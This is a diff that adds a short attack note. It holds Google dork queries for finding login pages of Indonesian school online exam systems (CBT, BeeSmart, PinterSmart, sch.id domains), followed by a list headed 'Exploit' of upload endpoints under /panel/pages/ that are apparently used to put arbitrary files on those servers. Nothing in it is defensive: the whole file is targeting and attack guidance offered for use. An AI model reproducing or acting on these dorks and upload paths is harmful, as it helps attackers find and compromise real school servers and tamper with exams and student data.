@@ -1,0 +1,21 @@
+Dork :
+
+inurl:/login.php intitle:ujian online
+inurl:/cbt/login.php site:sch.id
+inurl:/login.php intitle:cbt beesmart
+inurl:/login.php inurl:/cbt
+inurl:/login.php intitle:ujian sekolah
+inurl:/login.php intitle:ujian sma
+inurl:/login.php intitle:cbt pintersmart
+inurl:/login.php intitle:ujian pintersmart
+
+Exploit :
+
+/panel/pages/upload-file.php
+/panel/pages/upload_video.php
+/panel/pages/upload_audio.php
+/panel/pages/upload_gambar.php
+/panel/pages/upload-file.php
+/panel/pages/upload-fotosiswa.php
+/panel/pages/upload-banner.php
+/panel/pages/upload-logo.php
